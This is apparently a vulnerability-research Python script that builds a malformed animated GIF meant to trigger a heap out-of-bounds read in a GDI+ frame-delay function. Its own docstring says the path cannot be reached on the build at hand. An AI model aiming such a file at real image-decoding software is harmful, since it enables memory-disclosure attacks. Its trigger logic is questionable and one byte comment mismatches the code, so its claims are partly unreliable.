#!/usr/bin/env python3
"""
PoC Generator for VULN_001:
Heap Out-of-Bounds Read in gdip_bitmap_get_frame_delay via Inflated item_count

Vulnerability location: io-gdip-utils.c, lines 491-504 (Windows/GDI+ code)

Root cause:
  item_count = item_size / sizeof(long)
  where item_size is returned by GdipGetPropertyItemSize and includes the
  PropertyItem struct header (16 bytes) plus data payload. Dividing by
  sizeof(long) (8 on 64-bit) inflates item_count beyond the actual number
  of delay values stored in item->value.

  When frame >= actual_delay_count, the fallback path reads:
    ((long *)item->value)[item_count - 1]
  which may be past the end of the allocated item->value buffer.

Attack vector: Animated GIF with N frames but only 1 delay value in
  PropertyTagFrameDelay, so that accesses for frame >= 1 are OOB.

NOTE: This code path exists only in Windows builds using GDI+.
  This Linux build was compiled without io-gdip-*.c files, so the
  vulnerability cannot be triggered here. The script still produces a
  correctly-structured malformed GIF for documentation/reference purposes.
"""

import struct
import sys
import os


def make_lzw_image_data(width: int, height: int, color_index: int = 0) -> bytes:
    """
    Produce minimal LZW-compressed image data for a solid-color frame.
    Uses LZW minimum code size = 2 (palette has 4 entries).
    This is a hard-coded valid LZW stream for a 1x1 pixel image.
    """
    # LZW minimum code size
    min_code_size = 2
    # Pre-built LZW stream for a single pixel with color index 0
    # (clear code=4, pixel=0, eoi=5), packed into one sub-block
    lzw_stream = bytes([
        min_code_size,
        # sub-block length
        4,
        # LZW data: clear(100b=4), index(000b=0), EOI(101b=5)
        # packed LSB-first into bytes: 4=100, 0=000, 5=101 -> 10000101=0x85, then pad -> 0x00
        0x84, 0x01, 0x00, 0x00,
        # sub-block terminator
        0x00,
    ])
    return lzw_stream


def make_color_table(num_colors: int = 4) -> bytes:
    """Return a minimal global color table with num_colors entries (3 bytes each)."""
    colors = [
        b'\x00\x00\x00',  # 0: black
        b'\xff\x00\x00',  # 1: red
        b'\x00\xff\x00',  # 2: green
        b'\xff\xff\xff',  # 3: white
    ]
    result = b''
    for i in range(num_colors):
        result += colors[i % len(colors)]
    return result


def make_netscape_extension(loop_count: int = 0) -> bytes:
    """Build the Netscape 2.0 application extension block for looping."""
    return (
        b'\x21\xff\x0b'          # Extension introducer + App extension label + block size
        b'NETSCAPE2.0'            # Application identifier + auth code
        b'\x03\x01'              # Sub-block size + sub-block ID
        + struct.pack('<H', loop_count)  # Loop count (0 = infinite)
        + b'\x00'                # Sub-block terminator
    )


def make_graphic_control_extension(delay_centiseconds: int = 10,
                                   disposal: int = 0,
                                   transparent_index: int = 0,
                                   has_transparency: bool = False) -> bytes:
    """Build a Graphic Control Extension block."""
    packed = (disposal & 0x07) << 2
    if has_transparency:
        packed |= 0x01
    return (
        b'\x21\xf9\x04'          # Extension introducer + GCE label + block size
        + struct.pack('B', packed)
        + struct.pack('<H', delay_centiseconds)
        + struct.pack('B', transparent_index)
        + b'\x00'                # Block terminator
    )


def make_image_descriptor(left: int = 0, top: int = 0,
                           width: int = 1, height: int = 1,
                           local_color_table: bool = False) -> bytes:
    """Build an Image Descriptor block."""
    packed = 0x00
    if local_color_table:
        packed |= 0x80
    return (
        b'\x2c'
        + struct.pack('<H', left)
        + struct.pack('<H', top)
        + struct.pack('<H', width)
        + struct.pack('<H', height)
        + struct.pack('B', packed)
    )


def build_animated_gif(num_frames: int = 3,
                       width: int = 1,
                       height: int = 1,
                       output_path: str = 'vuln_001.gif') -> None:
    """
    Build an animated GIF with num_frames frames but only 1 delay value
    in the Graphic Control Extensions to simulate under-provisioned
    PropertyTagFrameDelay data (the trigger for VULN_001 on Windows/GDI+).

    On a GDI+ Windows build, calling GdipGetPropertyItemSize returns
    item_size = sizeof(PropertyItem) + actual_delay_bytes.
    Dividing by sizeof(long) inflates item_count.
    With only 1 real delay value but item_count > 1, reading
    ((long*)item->value)[item_count - 1] reads beyond the buffer.

    This GIF has:
      - Frame 0: GCE with delay=10cs  (1 real delay value)
      - Frame 1: GCE with delay=0cs   (triggers OOB path on Windows for frame>=1)
      - Frame 2: GCE with delay=0cs   (same)
    """
    num_colors = 4
    color_table_flag = 1       # has global color table
    color_resolution = 1       # bits per primary color minus 1
    sort_flag = 0
    gct_size_field = 1         # 2^(gct_size_field+1) = 4 colors
    packed_lsd = (
        (color_table_flag << 7)
        | (color_resolution << 4)
        | (sort_flag << 3)
        | gct_size_field
    )

    data = b''

    # --- Header ---
    data += b'GIF89a'

    # --- Logical Screen Descriptor ---
    data += struct.pack('<H', width)
    data += struct.pack('<H', height)
    data += struct.pack('B', packed_lsd)
    data += struct.pack('B', 0)    # background color index
    data += struct.pack('B', 0)    # pixel aspect ratio

    # --- Global Color Table ---
    data += make_color_table(num_colors)

    # --- Netscape looping extension ---
    data += make_netscape_extension(loop_count=0)

    # --- Frames ---
    # Frame 0: only frame with a "real" delay value (simulates the single
    # PropertyTagFrameDelay entry that GDI+ would store)
    data += make_graphic_control_extension(delay_centiseconds=10)
    data += make_image_descriptor(width=width, height=height)
    data += make_lzw_image_data(width, height, color_index=0)

    # Frames 1..N-1: delay=0 to signal missing/undersupplied delay data
    for i in range(1, num_frames):
        data += make_graphic_control_extension(delay_centiseconds=0)
        data += make_image_descriptor(width=width, height=height)
        data += make_lzw_image_data(width, height, color_index=i % num_colors)

    # --- Trailer ---
    data += b'\x3b'

    with open(output_path, 'wb') as f:
        f.write(data)

    print(f"[+] Generated {output_path} ({len(data)} bytes)")
    print(f"    Frames: {num_frames}, real delay entries: 1")
    print(f"    On Windows/GDI+: accessing frame 1+ would trigger OOB read")
    print(f"    On this Linux build: io-gdip-utils.c not compiled -> NOT triggered")


if __name__ == '__main__':
    poc_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(poc_dir, 'vuln_001.gif')
    build_animated_gif(num_frames=3, width=1, height=1, output_path=output_path)
